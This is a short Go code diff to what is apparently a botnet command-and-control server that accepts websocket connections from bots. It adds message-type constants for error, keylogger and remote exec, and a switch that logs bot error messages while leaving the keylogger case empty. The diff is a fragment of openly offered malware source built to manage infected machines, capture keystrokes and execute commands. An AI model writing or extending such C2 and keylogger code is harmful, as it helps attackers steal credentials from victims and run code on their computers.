@@ -13,6 +13,12 @@ import (
 	"github.com/coder/websocket/wsjson"
 )
 
+const (
+	ERROR_MSG = "error"
+	KEYLOGGER = "keylogger"
+	EXEC      = "exec"
+)
+
 func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	b := Bot{}
 
@@ -60,6 +66,14 @@ func (c *c2) listentoBot(bot *Bot) {
 		}
 
 		bot.updateLastseen()
+
+		switch msg.Type {
+		case ERROR_MSG:
+			fmt.Println("ERROR MESSAGE FROM BOT : ", bot.ID, "ERROR : ", msg.Message)
+			break
+		case KEYLOGGER:
+
+		}
 
 	}
 }
